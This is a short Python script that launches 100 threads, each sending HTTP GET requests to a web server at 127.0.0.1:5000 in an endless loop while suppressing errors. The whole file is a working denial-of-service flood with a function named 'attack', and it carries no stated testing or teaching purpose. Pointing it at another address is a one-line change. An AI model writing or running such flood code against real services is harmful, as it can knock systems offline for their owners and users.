import requests
import threading

target = "http://127.0.0.1:5000"

def attack():
    while True:
        try:
            requests.get(target)
        except:
            pass

for i in range(100):
    t = threading.Thread(target=attack)
    t.start()